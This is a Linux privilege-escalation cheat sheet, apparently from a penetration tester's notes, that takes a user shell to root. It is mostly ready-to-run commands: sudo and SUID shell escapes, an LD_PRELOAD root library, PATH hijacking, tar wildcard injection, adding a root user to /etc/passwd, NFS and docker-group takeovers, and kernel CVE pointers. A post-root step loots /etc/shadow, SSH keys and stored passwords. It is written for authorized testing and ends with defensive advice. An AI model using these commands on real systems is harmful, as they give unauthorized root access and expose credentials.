# Linux — Privilege Escalation

Worked exploitation for each local privesc vector — user shell → **root**. Enumerate first with the checklist and automation in [Enumeration & Privilege Escalation](Enumeration%20%26%20Privilege%20Escalation.md); this note is the "I found X, now how do I exploit it" reference. Overview and shell-stabilisation: [Linux Overview](Linux%20Overview.md).

> **Prefer misconfigurations over kernel exploits** — sudo/SUID/cron/capabilities are reliable and low-risk; kernel exploits can panic a client box. Confirm scope before anything that risks stability.

## sudo rules (`sudo -l`)

```bash
sudo -l                                   # what can I run as root, and with what env?
```

- **GTFOBins shell:** any allowed binary listed on GTFOBins drops a root shell.

  ```bash
  sudo vim -c ':!/bin/sh'
  sudo find . -exec /bin/sh \; -quit
  sudo awk 'BEGIN{system("/bin/sh")}'
  sudo less /etc/profile        # then type  !/bin/sh
  ```

- **`env_keep += LD_PRELOAD` / `LD_LIBRARY_PATH`:** compile a tiny shared object and preload it.

  ```bash
  gcc -fPIC -shared -o /tmp/x.so -xc - <<<'#include <stdlib.h>
  __attribute__((constructor)) void _(){setuid(0);system("/bin/sh");}'
  sudo LD_PRELOAD=/tmp/x.so <allowed-binary>
  ```

- **sudo CVEs:** Baron Samedit (**CVE-2021-3156**, heap overflow, sudo < 1.9.5p2) and the `sudoedit -s` path give root regardless of the rules — check `sudo --version`.

## SUID / SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
```

- **GTFOBins:** `find`, `bash -p`, `cp`, old `nmap --interactive`, `env`, `vim.basic`, etc. drop or preserve a root shell when SUID.
- **Custom SUID + relative PATH:** if it calls a bare command (`system("service ...")`), hijack `$PATH`.

  ```bash
  echo -e '#!/bin/sh\n/bin/bash -p' > /tmp/service; chmod +x /tmp/service
  PATH=/tmp:$PATH /path/to/suid_binary
  ```

- **Shared-object injection:** `strace`/`ltrace` the binary for an `open()` on a missing `.so` in a writable path, then plant it.

## Capabilities

```bash
getcap -r / 2>/dev/null
```

- **`cap_setuid+ep`** on an interpreter → set uid 0:

  ```bash
  /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
  ```

- **`cap_dac_read_search`** → read any file (e.g. `/etc/shadow`); **`cap_sys_admin`/`cap_sys_ptrace`** → broader takeover.

## Cron jobs & systemd timers

```bash
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
pspy64                                     # watch jobs + args live, no root needed
```

- **Writable script run by root** → append your payload.
- **Wildcard injection:** a root `tar`/`rsync`/`chown *` in a writable dir → drop crafted filenames.

  ```bash
  # tar --checkpoint wildcard -> command execution
  echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /writable/shell.sh
  touch /writable/--checkpoint=1 /writable/'--checkpoint-action=exec=sh shell.sh'
  ```

- **Relative path / writable `$PATH`** used by a root job → plant a matching binary.

## Writable sensitive files

```bash
# Writable /etc/passwd -> add a root user
openssl passwd -1 -salt x pass123                     # -> hash
echo 'r00t:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su r00t

# Writable /etc/shadow -> replace root's hash; writable /etc/sudoers(.d) -> grant NOPASSWD
```

## NFS `no_root_squash`

An export with `no_root_squash` lets a remote root create SUID files locally:

```bash
cat /etc/exports                                      # look for no_root_squash
# on your (root) box: mount it, drop a SUID shell
mount -t nfs <target>:/share /mnt; cp /bin/bash /mnt/rb; chmod +s /mnt/rb
# back on the target as a user:  /share/rb -p
```

## Group memberships

- **`docker`** — mount the host root and read/write anything as root:

  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```

- **`lxd`/`lxc`** — import an image and start a privileged container mounting `/`.
- **`disk`** — read/write the raw device (`debugfs /dev/sda1`) to grab `/etc/shadow`.

## Kernel & service exploits (last resort)

Match `uname -r` / distro to a known CVE with **linux-exploit-suggester**:

- **PwnKit** — `pkexec` local root, **CVE-2021-4034** (polkit; nearly universal 2009–2022).
- **Dirty Pipe** — **CVE-2022-0847** (kernel 5.8–5.16): overwrite read-only files (e.g. `/etc/passwd`).
- **DirtyCow** — **CVE-2016-5195** (older kernels).
- **OverlayFS** local-root variants (CVE-2021-3493, CVE-2023-0386).

```bash
./linux-exploit-suggester.sh              # shortlist by kernel/distro
```

## After root

```bash
id                                        # confirm uid=0
cat /etc/shadow; ls -la /root/.ssh        # loot hashes + keys
grep -rIl -e password -e secret /etc /opt /var/www 2>/dev/null   # creds for pivoting
```

Note persistence for the report (authorized only) and record any files you created so they can be cleaned up. Domain creds/keytabs found here feed the [AD notes](../AD/AD%20Attacks%20Overview.md) — see the Impacket note on domain-joined Linux.

## Defense / detection (for the report)

- Least-privilege sudo (no shell-spawning binaries, avoid `env_keep`/`NOPASSWD`), patch sudo/polkit/kernel promptly.
- Strip unnecessary SUID/SGID bits and file capabilities; audit them regularly.
- File-integrity monitoring on cron/timer dirs and `/etc/passwd`,`/etc/shadow`,`/etc/sudoers.d`.
- `auditd` rules for `execve` of shells by service accounts and for `setuid` calls; don't add users to `docker`/`lxd`/`disk` casually; set `root_squash` on NFS exports.
